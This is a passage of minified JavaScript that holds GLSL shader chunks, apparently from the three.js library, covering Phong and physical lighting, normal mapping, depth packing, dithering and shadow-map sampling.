geometry.normal, hemiLight.direction );\n\t\tfloat hemiDiffuseWeight = 0.5 * dotNL + 0.5;\n\t\tvec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tirradiance *= PI;\n\t\t#endif\n\t\treturn irradiance;\n\t}\n#endif",lights_phong_fragment:"BlinnPhongMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb;\nmaterial.specularColor = specular;\nmaterial.specularShininess = shininess;\nmaterial.specularStrength = specularStrength;",lights_phong_pars_fragment:"varying vec3 vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct BlinnPhongMaterial {\n\tvec3\tdiffuseColor;\n\tvec3\tspecularColor;\n\tfloat\tspecularShininess;\n\tfloat\tspecularStrength;\n};\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\t#ifdef TOON\n\t\tvec3 irradiance = getGradientIrradiance( geometry.normal, directLight.direction ) * directLight.color;\n\t#else\n\t\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\t\tvec3 irradiance = dotNL * directLight.color;\n\t#endif\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\n}\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n#define Material_LightProbeLOD( material )\t(0)",lights_physical_fragment:"PhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nmaterial.specularRoughness = clamp( roughnessFactor, 0.04, 1.0 );\n#ifdef REFLECTIVITY\n\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\n#endif\n#ifdef CLEARCOAT\n\tmaterial.clearcoat = saturate( clearcoat );\tmaterial.clearcoatRoughness = clamp( clearcoatRoughness, 0.04, 1.0 );\n#endif\n#ifdef USE_SHEEN\n\tmaterial.sheenColor = sheen;\n#endif",lights_physical_pars_fragment:"struct PhysicalMaterial {\n\tvec3\tdiffuseColor;\n\tfloat\tspecularRoughness;\n\tvec3\tspecularColor;\n#ifdef CLEARCOAT\n\tfloat clearcoat;\n\tfloat clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tvec3 sheenColor;\n#endif\n};\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\nfloat clearcoatDHRApprox( const in float roughness, const in float dotNL ) {\n\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\n}\n#if NUM_RECT_AREA_LIGHTS > 0\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.specularRoughness;\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight;\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(    0, 1,    0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\t}\n#endif\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNL = saturate( dot( geometry.clearcoatNormal, directLight.direction ) );\n\t\tvec3 ccIrradiance = ccDotNL * directLight.color;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tccIrradiance *= PI;\n\t\t#endif\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t\treflectedLight.directSpecular += ccIrradiance * material.clearcoat * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\t#ifdef USE_SHEEN\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_Sheen(\n\t\t\tmaterial.specularRoughness,\n\t\t\tdirectLight.direction,\n\t\t\tgeometry,\n\t\t\tmaterial.sheenColor\n\t\t);\n\t#else\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.normal, material.specularColor, material.specularRoughness);\n\t#endif\n\treflectedLight.directDiffuse += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNV = saturate( dot( geometry.clearcoatNormal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular += clearcoatRadiance * material.clearcoat * BRDF_Specular_GGX_Environment( geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t\tfloat ccDotNL = ccDotNV;\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\tfloat clearcoatInv = 1.0 - clearcoatDHR;\n\tvec3 singleScattering = vec3( 0.0 );\n\tvec3 multiScattering = vec3( 0.0 );\n\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\tBRDF_Specular_Multiscattering_Environment( geometry, material.specularColor, material.specularRoughness, singleScattering, multiScattering );\n\tvec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\treflectedLight.indirectSpecular += clearcoatInv * radiance * singleScattering;\n\treflectedLight.indirectDiffuse += multiScattering * cosineWeightedIrradiance;\n\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n}\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n}",lights_fragment_begin:"\nGeometricContext geometry;\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = normalize( vViewPosition );\n#ifdef CLEARCOAT\n\tgeometry.clearcoatNormal = clearcoatNormal;\n#endif\nIncidentLight directLight;\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\tPointLight pointLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec2( pointLight.shadow, directLight.visible ) ) ? getPointShadow( pointShadowMap[ i ], pointLight.shadowMapSize, pointLight.shadowBias, pointLight.shadowRadius, vPointShadowCoord[ i ], pointLight.shadowCameraNear, pointLight.shadowCameraFar ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\tSpotLight spotLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec2( spotLight.shadow, directLight.visible ) ) ? getShadow( spotShadowMap[ i ], spotLight.shadowMapSize, spotLight.shadowBias, spotLight.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\tDirectionalLight directionalLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )\n\t\tdirectLight.color *= all( bvec2( directionalLight.shadow, directLight.visible ) ) ? getShadow( directionalShadowMap[ i ], directionalLight.shadowMapSize, directionalLight.shadowBias, directionalLight.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\tRectAreaLight rectAreaLight;\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\t}\n#endif\n#if defined( RE_IndirectDiffuse )\n\tvec3 iblIrradiance = vec3( 0.0 );\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\tirradiance += getLightProbeIrradiance( lightProbe, geometry );\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\t\t#pragma unroll_loop\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t}\n\t#endif\n#endif\n#if defined( RE_IndirectSpecular )\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearcoatRadiance = vec3( 0.0 );\n#endif",lights_fragment_maps:"#if defined( RE_IndirectDiffuse )\n\t#ifdef USE_LIGHTMAP\n\t\tvec3 lightMapIrradiance = texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tlightMapIrradiance *= PI;\n\t\t#endif\n\t\tirradiance += lightMapIrradiance;\n\t#endif\n\t#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )\n\t\tiblIrradiance += getLightProbeIndirectIrradiance( geometry, maxMipLevel );\n\t#endif\n#endif\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\tradiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.normal, material.specularRoughness, maxMipLevel );\n\t#ifdef CLEARCOAT\n\t\tclearcoatRadiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.clearcoatNormal, material.clearcoatRoughness, maxMipLevel );\n\t#endif\n#endif",lights_fragment_end:"#if defined( RE_IndirectDiffuse )\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n#endif\n#if defined( RE_IndirectSpecular )\n\tRE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometry, material, reflectedLight );\n#endif",logdepthbuf_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tgl_FragDepthEXT = log2( vFragDepth ) * logDepthBufFC * 0.5;\n#endif",logdepthbuf_pars_fragment:"#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n#endif",logdepthbuf_pars_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvarying float vFragDepth;\n\t#else\n\t\tuniform float logDepthBufFC;\n\t#endif\n#endif",logdepthbuf_vertex:"#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\t#else\n\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\t\tgl_Position.z *= gl_Position.w;\n\t#endif\n#endif",map_fragment:"#ifdef USE_MAP\n\tvec4 texelColor = texture2D( map, vUv );\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n#endif",map_pars_fragment:"#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif",map_particle_fragment:"#ifdef USE_MAP\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n#endif",map_particle_pars_fragment:"#ifdef USE_MAP\n\tuniform mat3 uvTransform;\n\tuniform sampler2D map;\n#endif",metalnessmap_fragment:"float metalnessFactor = metalness;\n#ifdef USE_METALNESSMAP\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\tmetalnessFactor *= texelMetalness.b;\n#endif",metalnessmap_pars_fragment:"#ifdef USE_METALNESSMAP\n\tuniform sampler2D metalnessMap;\n#endif",morphnormal_vertex:"#ifdef USE_MORPHNORMALS\n\tobjectNormal += ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];\n\tobjectNormal += ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];\n\tobjectNormal += ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];\n\tobjectNormal += ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];\n#endif",morphtarget_pars_vertex:"#ifdef USE_MORPHTARGETS\n\t#ifndef USE_MORPHNORMALS\n\tuniform float morphTargetInfluences[ 8 ];\n\t#else\n\tuniform float morphTargetInfluences[ 4 ];\n\t#endif\n#endif",morphtarget_vertex:"#ifdef USE_MORPHTARGETS\n\ttransformed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];\n\ttransformed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];\n\ttransformed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];\n\ttransformed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];\n\t#ifndef USE_MORPHNORMALS\n\ttransformed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];\n\ttransformed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];\n\ttransformed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];\n\ttransformed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];\n\t#endif\n#endif",normal_fragment_begin:"#ifdef FLAT_SHADED\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n#else\n\tvec3 normal = normalize( vNormal );\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\t#ifdef USE_TANGENT\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\ttangent = tangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t\tbitangent = bitangent * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t#endif\n\t#endif\n#endif\nvec3 geometryNormal = normal;",normal_fragment_maps:"#ifdef OBJECTSPACE_NORMALMAP\n\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t#ifdef FLIP_SIDED\n\t\tnormal = - normal;\n\t#endif\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t#endif\n\tnormal = normalize( normalMatrix * normal );\n#elif defined( TANGENTSPACE_NORMALMAP )\n\t#ifdef USE_TANGENT\n\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy = normalScale * mapN.xy;\n\t\tnormal = normalize( vTBN * mapN );\n\t#else\n\t\tnormal = perturbNormal2Arb( -vViewPosition, normal, normalScale, normalMap );\n\t#endif\n#elif defined( USE_BUMPMAP )\n\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd() );\n#endif",normalmap_pars_fragment:"#ifdef USE_NORMALMAP\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n#endif\n#ifdef OBJECTSPACE_NORMALMAP\n\tuniform mat3 normalMatrix;\n#endif\n#if ! defined ( USE_TANGENT ) && ( defined ( TANGENTSPACE_NORMALMAP ) || defined ( USE_CLEARCOAT_NORMALMAP ) )\n\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm, vec2 normalScale, in sampler2D normalMap ) {\n\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\tvec2 st0 = dFdx( vUv.st );\n\t\tvec2 st1 = dFdy( vUv.st );\n\t\tfloat scale = sign( st1.t * st0.s - st0.t * st1.s );\n\t\tvec3 S = normalize( ( q0 * st1.t - q1 * st0.t ) * scale );\n\t\tvec3 T = normalize( ( - q0 * st1.s + q1 * st0.s ) * scale );\n\t\tvec3 N = normalize( surf_norm );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy *= normalScale;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvec3 NfromST = cross( S, T );\n\t\t\tif( dot( NfromST, N ) > 0.0 ) {\n\t\t\t\tS *= -1.0;\n\t\t\t\tT *= -1.0;\n\t\t\t}\n\t\t#else\n\t\t\tmapN.xy *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\t#endif\n\t\tmat3 tsn = mat3( S, T, N );\n\t\treturn normalize( tsn * mapN );\n\t}\n#endif",clearcoat_normal_fragment_begin:"#ifdef CLEARCOAT\n\tvec3 clearcoatNormal = geometryNormal;\n#endif",clearcoat_normal_fragment_maps:"#ifdef USE_CLEARCOAT_NORMALMAP\n\t#ifdef USE_TANGENT\n\t\tmat3 vTBN = mat3( tangent, bitangent, clearcoatNormal );\n\t\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t\tmapN.xy = clearcoatNormalScale * mapN.xy;\n\t\tclearcoatNormal = normalize( vTBN * mapN );\n\t#else\n\t\tclearcoatNormal = perturbNormal2Arb( - vViewPosition, clearcoatNormal, clearcoatNormalScale, clearcoatNormalMap );\n\t#endif\n#endif",clearcoat_normalmap_pars_fragment:"#ifdef USE_CLEARCOAT_NORMALMAP\n\tuniform sampler2D clearcoatNormalMap;\n\tuniform vec2 clearcoatNormalScale;\n#endif",packing:"vec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256.,  256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\nconst float ShiftRight8 = 1. / 256.;\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8;\treturn r * PackUpscale;\n}\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\nvec4 encodeHalfRGBA ( vec2 v ) {\n\tvec4 encoded = vec4( 0.0 );\n\tconst vec2 offset = vec2( 1.0 / 255.0, 0.0 );\n\tencoded.xy = vec2( v.x, fract( v.x * 255.0 ) );\n\tencoded.xy = encoded.xy - ( encoded.yy * offset );\n\tencoded.zw = vec2( v.y, fract( v.y * 255.0 ) );\n\tencoded.zw = encoded.zw - ( encoded.ww * offset );\n\treturn encoded;\n}\nvec2 decodeHalfRGBA( vec4 v ) {\n\treturn vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );\n}\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}",premultiplied_alpha_fragment:"#ifdef PREMULTIPLIED_ALPHA\n\tgl_FragColor.rgb *= gl_FragColor.a;\n#endif",project_vertex:"vec4 mvPosition = modelViewMatrix * vec4( transformed, 1.0 );\ngl_Position = projectionMatrix * mvPosition;",dithering_fragment:"#ifdef DITHERING\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n#endif",dithering_pars_fragment:"#ifdef DITHERING\n\tvec3 dithering( vec3 color ) {\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\t\treturn color + dither_shift_RGB;\n\t}\n#endif",roughnessmap_fragment:"float roughnessFactor = roughness;\n#ifdef USE_ROUGHNESSMAP\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\troughnessFactor *= texelRoughness.g;\n#endif",roughnessmap_pars_fragment:"#ifdef USE_ROUGHNESSMAP\n\tuniform sampler2D roughnessMap;\n#endif",shadowmap_pars_fragment:"#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\t}\n\tvec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {\n\t\treturn decodeHalfRGBA( texture2D( shadow, uv ) );\n\t}\n\tfloat VSMShadow (sampler2D shadow, vec2 uv, float compare ){\n\t\tfloat occlusion = 1.0;\n\t\tvec2 distribution = texture2DDistribution( shadow, uv );\n\t\tfloat hard_shadow = step( compare , distribution.x );\n\t\tif (hard_shadow != 1.0 ) {\n\t\t\tfloat distance = compare - distribution.x ;\n\t\t\tfloat variance = max( 0.00000, distribution.y * distribution.y );\n\t\t\tfloat softness_probability = variance / (variance + distance * distance );\t\t\tsoftness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );\t\t\tocclusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );\n\t\t}\n\t\treturn occlusion;\n\t}\n\tfloat texture2DShadowLerp( sampler2D depths, vec2 size, vec2 uv, float compare ) {\n\t\tconst vec2 offset = vec2( 0.0, 1.0 );\n\t\tvec2 texelSize = vec2( 1.0 ) / size;\n\t\tvec2 centroidUV = ( floor( uv * size - 0.5 ) + 0.5 ) * texelSize;\n\t\tfloat lb = texture2DCompare( depths, centroidUV + texelSize * offset.xx, compare );\n\t\tfloat lt = texture2DCompare( depths, centroidUV + texelSize * offset.xy, compare );\n\t\tfloat rb = texture2DCompare( depths, centroidUV + texelSize * offset.yx, compare );\n\t\tfloat rt = texture2DCompare( depths, centroidUV + texelSize * offset.yy, compare );\n\t\tvec2 f = fract( uv * size + 0.5 );\n\t\tfloat a = mix( lb, lt, f.y );\n\t\tfloat b = mix( rb, rt, f.y );\n\t\tfloat c = mix( a, b, f.x );\n\t\treturn c;\n\t}\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\t\tfloat shadow = 1.0;\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\t\tbool frustumTest = all( frustumTestVec );\n\t\tif ( frustumTest ) {\n\t\t#if defined( SHADOWMAP_TYPE_PCF )\n\t\t\tvec2 texelSize = vec2( 1.0 ) / shadowMapSize;\n\t\t\tfloat dx0 = - texelSize.x * shadowRadius;\n\t\t\tfloat dy0 = - texelSize.y * shadowRadius;\n\t\t\tfloat dx1 = + texelSize.x * shadowRadius;\n\t\t\tfloat dy1 = + texelSize.y * shadowRadius;\n\t\t\tfloat dx2 = dx0 / 2.0;\n\t\t\tfloat dy2 = dy0 / 2.0;\n\t\t\tfloat dx3 = dx1 / 2.0;\n\t\t\tfloat dy3 = dy1 / 2.0;\n\t\t\tshadow = (\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +\n\t\t\t\ttexture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) 